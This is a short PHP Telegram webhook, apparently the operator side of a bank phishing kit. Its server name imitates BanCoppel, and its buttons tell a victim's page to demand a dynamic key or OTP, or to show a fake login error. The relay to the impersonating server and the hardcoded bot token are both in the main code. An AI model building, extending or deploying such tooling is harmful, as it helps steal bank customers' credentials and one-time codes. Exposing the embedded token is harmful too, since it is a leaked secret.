<?php
// hook.php - Webhook para botones interactivos de Telegram

// CONFIGURACIÓN
$botToken = "7100847504:AAEx_w_mugzLVQp8HgfPxBmlhIBXzD11H_k";
$sendStatusURL = "https://bancoppel.onrender.com/sendStatus.php";

// LEE LOS DATOS DEL BOTÓN PRESIONADO
$update = json_decode(file_get_contents("php://input"), true);

if (isset($update["callback_query"])) {
    $callback = $update["callback_query"];
    $data = $callback["data"];
    $chat_id = $callback["message"]["chat"]["id"];
    $callback_id = $callback["id"];

    // Dividir tipo de acción y transactionId
    list($accion, $txId) = explode(":", $data);

    // Mapeo de acciones
    $acciones = [
        "pedir_dinamica" => "Pedir Clave Dinámica",
        "error_logo" => "Error de Logo",
        "error_otp" => "Error OTP",
        "confirm_finalizar" => "Finalización Exitosa",
        "finalizar" => "Finalización General",
    ];

    if (isset($acciones[$accion])) {
        $texto = $acciones[$accion];

        // ✅ Confirmar al usuario (impide que el botón se quede “pegado”)
        file_get_contents("https://api.telegram.org/bot$botToken/answerCallbackQuery?callback_query_id=$callback_id&text=" . urlencode("✅ Acción: $texto"));

        // ✅ Notificar a tu sistema (opcional)
        file_get_contents($sendStatusURL . "?status=" . urlencode($texto));
    }
}
?>
